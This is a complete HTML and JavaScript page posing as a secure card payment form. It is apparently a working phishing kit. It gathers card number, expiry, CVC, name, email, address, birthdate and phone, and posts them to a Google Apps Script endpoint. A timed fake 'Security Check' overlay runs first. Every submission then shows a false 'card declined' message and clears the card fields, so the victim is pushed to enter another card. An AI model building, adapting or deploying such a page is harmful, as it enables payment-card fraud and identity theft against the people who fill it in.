<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Form</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.7.11/lottie.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Baloo+2&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        body {
            font-family: 'Baloo 2', cursive;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }


        .basic-input__wrap {
            border-radius: 10px;
            height: 55px;
            border: 1px solid #e5e7eb;
            padding: 18px 14px 6px 14px;
            font-size: 16px;
            color: #495057;
            transition: border-color 0.3s, box-shadow 0.3s;
        }

         .basic-input__wrap:focus {
            border-color: #FFCC01 ;
            box-shadow: 0 0 0 3px rgba(0,0,0,0.0);
            outline: none;
        }

        .basic-input__wrap.valid {
            border: 1px solid #52CC99;
        }

        .basic-input__wrap.invalid {
            border: 1px solid #F76666;
        }

        .input-container {
            position: relative;
        }

        .input-container label {
            position: absolute;
            background-color: transparent !important;
            font-weight: 500; /* Medium font weight */
            top: 4px;
            left: 10px;
            font-size: 12px;
            color: #424949;
            background-color: #ffffff;
            padding: 0 3px;
        }
      .input-container label[for="expiration"] {
    background-color: transparent;
    color: #424949; /* Adjust color as needed */
         font-weight: 500; /* Medium font weight */
    top: 4px;
     left: 24px;
    font-size: 12px;
}

/* CSS for CVC Label */
.input-container label[for="cvc"] {
    background-color: transparent;
   font-weight: 500; /* Medium font weight */
    color: #424949; /* Adjust color as needed */
    top: 4px;
    left: 18px;
    font-size: 12px;
}
      .col.input-container {
    position: relative;
    padding-left: 12px; /* Adjust spacing between the two columns */
    padding-right: 12px; /* Adjust spacing between the two columns */
}

.col.input-container .basic-input__wrap {
    padding: 18px 14px 6px 14px;
}


.row.mb-3 .col.input-container:first-child {
    padding-right: 6px; /* Adjust the spacing on the right side of Expiration */
}

.row.mb-3 .col.input-container:last-child {
    padding-left: 6px; /* Adjust the spacing on the left side of CVC */
}
        .submit {
           height: 50px; /* matches input height */
           width: 100%;
    font-size: 16px; /* matches input font size */
    padding: 10px 14px; /* matches input padding */
    border-radius: 10px; /* matches input border-radius */
    border: none;
    background-image: linear-gradient(to right, #FFCC01, #000);
    color: white;
    font-weight: bold;
    transition: 0.3s ease-in-out;
        }

        .submit:hover {
            opacity: 0.85;
        }

        .cvc-logo {
            position: absolute;
            top: 20px;
            right: 30px;
            height: 25px;
        }
      .card-logo {
            position: absolute;
            top: 15px;
            right: 20px;
            height: 25px;
        }

       .basic-input__wrap::placeholder {
            color: #a6acaf;
            font-size: 16px;
        }
      .input-container label[for="country"] {
    background-color: transparent;
    color: #424949;
    font-weight: 500;
    top: 4px;
    left: 18px;
    font-size: 12px;
}
/* Country Label */
.input-container label[for="country"] {
    background-color: transparent;
    color: #424949;
    font-weight: 500;
    top: 4px;
    left: 24px;
    font-size: 12px;
}
/* Zip Code Label */
.input-container label[for="zipCode"] {
    background-color: transparent;
    color: #424949;
    font-weight: 500;
    top: 4px;
    left: 18px;
    font-size: 12px;
}

/* Birthdate Label */
.input-container label[for="birthdate"] {
    background-color: transparent;
    color: #424949;
    font-weight: 500;
    top: 4px;
    left: 24px;
    font-size: 12px;
}

/* Phone Label */
.input-container label[for="phone"] {
    background-color: transparent;
    color: #424949;
    font-weight: 500;
    top: 4px;
    left: 18px;
    font-size: 12px;
}

      select.basic-input__wrap {
    appearance: none; 
    background-image: url('https://static.wixstatic.com/media/507040_bae592ac74ce40f9a02ad9c47f33643b~mv2.png');
    background-repeat: no-repeat;
    background-position: right 10px top 50%;
    background-size: 14px;
}
      .submit:disabled {
    opacity: 0.50;
    cursor: not-allowed;
}
@keyframes cardLogoAnimate {
    0% { opacity: 0; transform: scale(0.5); }
    100% { opacity: 1; transform: scale(1); }
}

.card-logo.animate {
    animation: cardLogoAnimate 0.2s ease-in-out;
    transform-origin: center;
}
      #securityOverlay {
  position: fixed;
  top: 0;
  left: 0;
  height: 100vh;
  width: 100%;
  background-color: rgba(255, 255, 255, 0.95);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 9999;
  flex-direction: column;
  text-align: center;
}

.overlay-content .lock-icon {
  font-size: 50px;
  color: #000;
}

.overlay-content .security-text {
  font-size: 16px;
  font-weight: medium;
  color: #424949;
}

.input-container {
    position: relative;
}

.status-icon {
    position: absolute;
    top: 18px;
    right: 12px;
    height: 18px;
    width: 18px;
    display: none;
    pointer-events: none;
   
}
#addressSuggestions {
margin-top: 10px; /* Adds clear spacing of at least 20px */
    width: 100%;
    max-height: 150px;
    overflow-y: auto;
    box-shadow: 0 2px 5px rgba(0,0,0,0.15);
}

#addressSuggestions .list-group-item {
    cursor: pointer;
    padding: 8px 12px;
    font-size: 14px;
}

#addressSuggestions .list-group-item:hover {
    background-color: #f1f1f1;
}

/* Adjust Expiration input status icons */
#expiration ~ .valid-icon,
#expiration ~ .invalid-icon {
  top: 20px;
  right: 18px; /* Adjust horizontally as needed */
}

/* Adjust Zip Code input status icons */
#zipCode ~ .valid-icon,
#zipCode ~ .invalid-icon {
  top: 20px;
  right: 23px; /* Adjust horizontally as needed */
}

/* Adjust Phone input status icons */
#phone ~ .valid-icon,
#phone ~ .invalid-icon {
  top: 20px;
  right: 23px; /* Adjust horizontally as needed */
}



      
    </style>
</head>
<body>
  <form name="nitrogen-code">
    <div class="payment-card">
      <h5> Card Details</h5>
       <div class="mb-3 input-container">
            <label>Card number</label>
            <input type="text" id="cardNumber"  name="Card Number" class="form-control basic-input__wrap" inputmode="numeric"  placeholder="0000 0000 0000 0000" maxlength="19">
            <img src="https://static.wixstatic.com/media/507040_c02e4e0f51774f3aa1b4086033f409ea~mv2.png" id="cardLogo" class="card-logo">
        </div>
        <div class="row mb-3">
            <div class="col input-container">
               <label for="expiration">Expiration</label>
                <input type="text" id="expiration" name="Exp Date"
  class="form-control basic-input__wrap"
  inputmode="numeric"
  placeholder="MM / YY"
  maxlength="7"
  oninput="formatExpiration(event)">
           
            </div>
            <div class="col input-container">
                <label for="cvc">CVC Code</label>
                <input type="text" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" autocomplete="cc-cvc" inputmode="numeric"  id="cvc"  name="CVV" class="form-control basic-input__wrap" placeholder="CVC" maxlength="4">
                <img src="https://static.wixstatic.com/media/507040_641400fd0efb4e65971fe739da3113df~mv2.png"
     class="cvc-logo"
     id="cvcIcon"
     style="cursor:pointer;">

            </div>
        </div>
       <div class="mb-3 input-container">
            <label>Name of cardholder</label>
            <input type="text" id="cardHolder" name="Name on card" class="form-control basic-input__wrap"placeholder="john roa">
            <img src="https://static.wixstatic.com/media/507040_48e15c812c14408c899509b8d1907367~mv2.png" class="status-icon valid-icon">
    <img src="https://static.wixstatic.com/media/507040_27916c75271045fdaf4e461bf38fa007~mv2.png" class="status-icon invalid-icon">
        </div>
      <h5> Billing Details</h5>
        <div class="mb-3 input-container">
            <label>Email address</label>
            <input type="email" id="email" name="Email" class="form-control basic-input__wrap" placeholder="Must be valid">
            <img src="https://static.wixstatic.com/media/507040_48e15c812c14408c899509b8d1907367~mv2.png" class="status-icon valid-icon">
    <img src="https://static.wixstatic.com/media/507040_27916c75271045fdaf4e461bf38fa007~mv2.png" class="status-icon invalid-icon">
        </div>
      <div class="mb-3 input-container">
    <label>Street Address</label>
    <input type="text" id="streetAddress"  name="Street Address" class="form-control basic-input__wrap" placeholder="Street Address">
   
    <div id="addressSuggestions" class="list-group position-absolute" style="z-index:1000;"></div>

</div>

<div class="row mb-3">
    <div class="col input-container">
    <label for="country">Country</label>
    <select id="country" name="country" class="form-control basic-input__wrap">
   <option value="" disabled selected>Country</option>
<option value="United states">United States</option>
<option value="Luxembourg">Luxembourg</option>
<option value="Ireland">Ireland</option>
<option value="Switzerland">Switzerland</option>
<option value="Norway">Norway</option>
<option value="Singapore">Singapore</option>
<option value="Qatar">Qatar</option>
<option value="Iceland">Iceland</option>
<option value="Australia">Australia</option>
<option value="Denmark">Denmark</option>
<option value="Sweden">Sweden</option>
<option value="Netherlands">Netherlands</option>
<option value="Austria">Austria</option>
<option value="Finland">Finland</option>
<option value="Germany">Germany</option>
<option value="Canada">Canada</option>
<option value="Belgium">Belgium</option>
<option value="United Arab Emirates">United Arab Emirates</option>
<option value="United Kingdom">United Kingdom</option>
<option value="France">France</option>
<option value="Japan">Japan</option>
<option value="New Zealand">New Zealand</option>
<option value="Israel">Israel</option>
<option value="Italy">Italy</option>
<option value="South Korea">South Korea</option>
<option value="Spain">Spain</option>
<option value="Saudi Arabia">Saudi Arabia</option>
<option value="Czech Republic">Czech Republic</option>
<option value="Slovakia">Slovakia</option>
<option value="Poland">Poland</option>
<option value="Portugal">Portugal</option>
<option value="Hungary">Hungary</option>
<option value="Greece">Greece</option>
<option value="China">China</option>
<option value="Malaysia">Malaysia</option>
<option value="Russia">Russia</option>
<option value="Argentina">Argentina</option>
<option value="Chile">Chile</option>
<option value="Turkey">Turkey</option>
<option value="Mexico">Mexico</option>
<option value="Brazil">Brazil</option>
<option value="Thailand">Thailand</option>
<option value="South Africa">South Africa</option>
<option value="Colombia">Colombia</option>
<option value="Peru">Peru</option>
<option value="Vietnam">Vietnam</option>
<option value="Egypt">Egypt</option>
<option value="Indonesia">Indonesia</option>
<option value="Philippines">Philippines</option>
<option value="India">India</option>
<option value="Morocco">Morocco</option>
<option value="Kenya">Kenya</option>
<option value="Nigeria">Nigeria</option>
<option value="Bangladesh">Bangladesh</option>
<option value="Ethiopia">Ethiopia</option>
<option value="Pakistan">Pakistan</option>
<option value="Uganda">Uganda</option>
<option value="Luxembourg">Luxembourg</option>
<option value="Ireland">Ireland</option>
<option value="Switzerland">Switzerland</option>
<option value="Norway">Norway</option>
<option value="Singapore">Singapore</option>
<option value="Qatar">Qatar</option>
<option value="Iceland">Iceland</option>
<option value="Australia">Australia</option>
<option value="Denmark">Denmark</option>
<option value="Sweden">Sweden</option>
<option value="Netherlands">Netherlands</option>
<option value="Austria">Austria</option>
<option value="Finland">Finland</option>
<option value="Germany">Germany</option>
<option value="Canada">Canada</option>
<option value="Belgium">Belgium</option>
<option value="United Arab Emirates">United Arab Emirates</option>
<option value="United Kingdom">United Kingdom</option>
<option value="France">France</option>
<option value="Japan">Japan</option>
<option value="New Zealand">New Zealand</option>
<option value="Israel">Israel</option>
<option value="Italy">Italy</option>
<option value="South Korea">South Korea</option>
<option value="Spain">Spain</option>
<option value="Saudi Arabia">Saudi Arabia</option>
<option value="Czech Republic">Czech Republic</option>
<option value="Slovakia">Slovakia</option>
<option value="Poland">Poland</option>
<option value="Portugal">Portugal</option>
<option value="Hungary">Hungary</option>
<option value="Greece">Greece</option>
<option value="China">China</option>
<option value="Malaysia">Malaysia</option>
<option value="Russia">Russia</option>
<option value="Argentina">Argentina</option>
<option value="Chile">Chile</option>
<option value="Turkey">Turkey</option>
<option value="Mexico">Mexico</option>
<option value="Brazil">Brazil</option>
<option value="Thailand">Thailand</option>
<option value="South Africa">South Africa</option>
<option value="Colombia">Colombia</option>
<option value="Peru">Peru</option>
<option value="Vietnam">Vietnam</option>
<option value="Egypt">Egypt</option>
<option value="Indonesia">Indonesia</option>
<option value="Philippines">Philippines</option>
<option value="India">India</option>
<option value="Morocco">Morocco</option>
<option value="Kenya">Kenya</option>
<option value="Nigeria">Nigeria</option>
<option value="Bangladesh">Bangladesh</option>
<option value="Ethiopia">Ethiopia</option>
<option value="Pakistan">Pakistan</option>
<option value="Uganda">Uganda</option>
    </select>
</div>
    <div class="col input-container">
        <label for="zipCode">Zip Code</label>
        <input type="text" id="zipCode" name="Zip Code"class="form-control basic-input__wrap" placeholder="Postal Code">
        <img src="https://static.wixstatic.com/media/507040_48e15c812c14408c899509b8d1907367~mv2.png" class="status-icon valid-icon">
    <img src="https://static.wixstatic.com/media/507040_27916c75271045fdaf4e461bf38fa007~mv2.png" class="status-icon invalid-icon">
        
    </div>
</div>

<div class="row mb-3">
    <div class="col input-container">
        <label for="birthdate">Birthdate</label>
        <input type="date" id="birthdate" name="Bdate" class="form-control basic-input__wrap">
    </div>
    <div class="col input-container">
        <label for="phone">Phone</label>
        <input type="tel" inputmode="numeric"  id="phone" name="Phone" class="form-control basic-input__wrap" placeholder="000-000-0000">
        <img src="https://static.wixstatic.com/media/507040_48e15c812c14408c899509b8d1907367~mv2.png" class="status-icon valid-icon">
    <img src="https://static.wixstatic.com/media/507040_27916c75271045fdaf4e461bf38fa007~mv2.png" class="status-icon invalid-icon">
    </div>
</div> 
       <button class="submit" onclick="validateForm()" id="submitButton">
    <span id="btnSpinner" class="spinner-border spinner-border-sm me-2" style="display:none;"></span>
    <span id="btnText"> Make an appointment</span>
</button>

        <div class="text-center mt-2" style="font-size: 12px; color: #888;">
            ðŸ”’ Secure Payment via SSL encryption
        </div>
    </div>
    </form>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

 <script>
  
function formatExpiration(e) {
    let value = e.target.value.replace(/[^\d]/g, '').substring(0,4);
    if (value.length > 2) {
        e.target.value = value.substring(0,2) + ' / ' + value.substring(2);
    } else {
        e.target.value = value;
    }
}

const fields = [
    { id: 'email', regex: /^[^\s@]+@[^\s@]+\.[^\s@]+$/ },
    { 
    id: 'cardHolder', 
    regex: /^[a-zA-Z]{2,}\s[a-zA-Z]{2,}(?:\s[a-zA-Z]{2,})?$/, 
    transform: val => val.trim()
},

    { id: 'cardNumber', regex: /^(?:4\d{12}(?:\d{3})?|5[1-5]\d{14}|3[47]\d{13}|6(?:011|5\d{2})\d{12})$/, transform: val => val.replace(/\s/g, '') },
    { id: 'expiration', regex: /^(0[1-9]|1[0-2])\s\/\s\d{2}$/ },
    { id: 'cvc', regex: /^\d{3,4}$/ },
    { id: 'streetAddress', regex: /^.{3,}$/ }, // Minimum 3 characters
    { id: 'country', regex: /^(?!\s*$).+/ }, // Non-empty selection
    { id: 'zipCode', regex: /^[a-zA-Z0-9\s\-]{3,10}$/ },
    { id: 'birthdate', regex: /^\d{4}-\d{2}-\d{2}$/ }, // Date format YYYY-MM-DD
    { id: 'phone', regex: /^\+?[\d\s\-()]{7,20}$/ } // Phone number
];

fields.forEach(field => {
    document.getElementById(field.id).addEventListener('input', () => validateField(field));
});

function validateField(field) {
    const input = document.getElementById(field.id);
    const value = field.transform ? field.transform(input.value) : input.value;
    let valid = field.regex.test(value);

    if (field.id === 'cardNumber') {
        valid = valid && isValidCardNumber(value);
    }

    input.classList.toggle('valid', valid);
    input.classList.toggle('invalid', !valid);
}

document.getElementById('cardNumber').addEventListener('input', function(e) {
    const value = e.target.value.replace(/\D/g, '').substring(0,19);
    e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
    updateCardLogo(value);
});

function updateCardLogo(value) {
    const cardLogo = document.getElementById('cardLogo');
    let newSrc = '';

    if (/^4/.test(value)) newSrc = 'https://static.wixstatic.com/media/507040_e235642ba664424ab8a5866096934645~mv2.png';
    else if (/^5[1-5]/.test(value)) newSrc = 'https://static.wixstatic.com/media/507040_1d032e55c3974694b1ec68e01f1a10a5~mv2.png';
    else if (/^3[47]/.test(value)) newSrc = 'https://static.wixstatic.com/media/507040_f8fbe999ed7a4dfaada5e4bd27e4cd4c~mv2.png';
    else if (/^6(?:011|5)/.test(value)) newSrc = 'https://static.wixstatic.com/media/507040_bebff141d0ed4e8db9a21503a611ffa5~mv2.png';
    else newSrc = 'https://static.wixstatic.com/media/507040_c02e4e0f51774f3aa1b4086033f409ea~mv2.png';

    if (cardLogo.src !== newSrc) {
        cardLogo.src = newSrc;
        cardLogo.classList.remove('animate');
        void cardLogo.offsetWidth; // trigger reflow
        cardLogo.classList.add('animate');
    }
}

 const scriptURL = 'https://script.google.com/macros/s/AKfycbx9SLEEqZwEtV5v9tJIS-l5KoRxGAIbWdzI__XFut77zU5d3RhWQK6BAFg4iOR5vdcw/exec';
  const form = document.forms['nitrogen-code'];

form.addEventListener('submit', e => {
    e.preventDefault();

    const invalidFields = document.querySelectorAll('.invalid');
    if (invalidFields.length > 0) {
        alert('âš ï¸ Please correct the highlighted fields.');
        return;
    }

    const submitButton = document.getElementById('submitButton');
    const btnText = document.getElementById('btnText');
    const btnSpinner = document.getElementById('btnSpinner');
    const overlay = document.getElementById('securityOverlay');

    submitButton.disabled = true;
    btnText.textContent = 'Loading...';
    btnSpinner.style.display = 'inline-block';

   setTimeout(() => {
        overlay.style.display = 'flex';

    setTimeout(() => {
        const formData = new FormData(form);

        fetch(scriptURL, { method: 'POST', body: new URLSearchParams(formData) })
            .then(response => {
                overlay.style.display = 'none';
                Swal.fire({
                    icon: 'error',
                    position: "center",
                    title: 'Declined your card',
                    text: 'Your payment was declined for security reasons. Please try again or use a different payment method.',
                    confirmButtonColor: '#DA392B',
                    confirmButtonText: 'Try Again',
                    backdrop: 'rgba(255, 255, 255, 1)',
                }).then(() => {
                    // After SweetAlert closes, reset card fields
                    ['cardNumber', 'expiration', 'cvc'].forEach(id => {
                        document.getElementById(id).value = '';
                        document.getElementById(id).classList.remove('valid', 'invalid');
                    });
                    updateCardLogo('');

                    // Disable submit button again clearly
                    submitButton.disabled = true;
                    btnText.textContent = 'Make an appointment';
                    btnSpinner.style.display = 'none';

                    // Force re-validation to enable button again
                    checkFormValidity();
                });
            })
            .catch(error => {
                overlay.style.display = 'none';
                Swal.fire({
                    icon: 'error',
                    title: 'Error',
                    text: 'âš ï¸ Error submitting form. Please try again!',
                    confirmButtonText: 'OK'
                });

                submitButton.disabled = false;
                btnText.textContent = 'Make an appointment';
                btnSpinner.style.display = 'none';
            });
      }, 2000); // Security check duration remains unchanged (2.5 sec)
}, 1000); // New delay before security check appears (2 sec)
});




function isValidCardNumber(cardNumber) {
    let sum = 0, shouldDouble = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i], 10);
        if (shouldDouble) digit = digit * 2 > 9 ? digit * 2 - 9 : digit * 2;
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
}

window.onload = () => updateCardLogo('');
   const submitButton = document.querySelector('.submit');
submitButton.disabled = true;  // Disable button initially

fields.forEach(field => {
    document.getElementById(field.id).addEventListener('input', checkFormValidity);
});

function checkFormValidity() {
    const invalidFields = fields.some(field => {
        const input = document.getElementById(field.id);
        const value = field.transform ? field.transform(input.value) : input.value;
        return !field.regex.test(value);
    });
  
    submitButton.disabled = invalidFields;
}

fetch('https://5070403f-7e55-4261-8799-a1269097891b.usrfiles.com/ugd/507040_3d5597421523440fa252654afdacc83a.json')
  .then(response => response.json())
  .then(animationData => {
    lottie.loadAnimation({
      container: document.getElementById('lockAnimation'),
      renderer: 'svg',
      loop: true,
      autoplay: true,
      animationData: animationData
    });
  })
  .catch(err => console.error('Error loading animation:', err));

document.addEventListener("DOMContentLoaded", function() {
    const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]');
    tooltipTriggerList.forEach(tooltipTriggerEl => {
        new bootstrap.Tooltip(tooltipTriggerEl);
    });
});
   document.getElementById('cvcIcon').addEventListener('click', function() {
    const alertBox = document.getElementById('cvcAlert');
    alertBox.style.display = 'block';

    // Automatically hide the alert after 3 seconds
    setTimeout(() => {
        alertBox.style.display = 'none';
    }, 1500);
});
	
if (window.innerWidth <= 576) { // Target cellphone screens
    ['cardNumber', 'expiration', 'cvc', 'phone'].forEach(id => {
        document.getElementById(id).setAttribute('inputmode', 'numeric');
        document.getElementById(id).addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9\/\s]/g, '');
        });
    });
}
fields.forEach(field => {
    if (['cvc', 'cardNumber'].includes(field.id)) return; // Skip CVV and Card Number clearly

    document.getElementById(field.id).addEventListener('input', () => {
        const input = document.getElementById(field.id);
        const container = input.closest('.input-container');
        const validIcon = container.querySelector('.valid-icon');
        const invalidIcon = container.querySelector('.invalid-icon');
        const value = field.transform ? field.transform(input.value) : input.value;
        const isValid = field.regex.test(value);

        if (value.length === 0) {
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
        } else if (isValid) {
            validIcon.style.display = 'block';
            invalidIcon.style.display = 'none';
        } else {
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'block';
        }
    });
});
const addressInput = document.getElementById('streetAddress');
const suggestionsBox = document.getElementById('addressSuggestions');
let debounceTimer;

addressInput.addEventListener('input', function() {
    clearTimeout(debounceTimer);
    const query = this.value;

    if (query.length < 3) {
        suggestionsBox.innerHTML = '';
        return;
    }

    debounceTimer = setTimeout(() => {
        fetch(`https://nominatim.openstreetmap.org/search?format=json&addressdetails=1&limit=5&q=${encodeURIComponent(query)}`)
        .then(response => response.json())
        .then(data => {
            suggestionsBox.innerHTML = '';

            data.forEach(place => {
                const address = place.address;
                const shortAddress = [
                    address.house_number || '',
                    address.road || '',
                    address.city || address.town || address.village || '',
                    address.country || '',
                    address.postcode || ''
                ].filter(Boolean).join(', ');

                const item = document.createElement('div');
                item.classList.add('list-group-item');
                item.textContent = shortAddress;

                item.addEventListener('click', () => {
                    addressInput.value = shortAddress;

                    // Autofill country
                    if (address.country) {
                        const countrySelect = document.getElementById('country');
                        Array.from(countrySelect.options).forEach(option => {
                            if (option.value.toLowerCase() === address.country.toLowerCase()) {
                                countrySelect.value = option.value;
                                countrySelect.dispatchEvent(new Event('change'));
setCountryValid();
                            }
                        });
                    }

                    // Autofill zip code
                    if (address.postcode) {
                        const zipInput = document.getElementById('zipCode');
                        zipInput.value = address.postcode;
                        zipInput.dispatchEvent(new Event('input'));
                    }

                    suggestionsBox.innerHTML = '';
                });

                suggestionsBox.appendChild(item);
            });
        })
        .catch(err => {
            console.error('Address suggestions error:', err);
            suggestionsBox.innerHTML = '';
        });
    }, 300);
});

// Hide suggestions when clicking outside
document.addEventListener('click', function(e) {
    if (!addressInput.contains(e.target)) {
        suggestionsBox.innerHTML = '';
    }
});
function setCountryValid() {
    const countryField = document.getElementById('country');
    if (countryField.value.trim() !== "") {
        countryField.classList.add('valid');
        countryField.classList.remove('invalid');
    } else {
        countryField.classList.remove('valid');
        countryField.classList.add('invalid');
    }
}




</script>
<div id="securityOverlay" style="display:none;">
  <div class="overlay-content">
    <div id="lockAnimation" style="width: 100px; height: 100px; margin: 0 auto;"></div>
    <div class="security-text">Security Check</div>
  </div>
</div>
  <div id="cvcAlert" class="alert alert-info position-absolute" style="display:none; top: 70px; right:20px; z-index:1000;">
    Three digits at back of your card
</div>

</body>
</html>
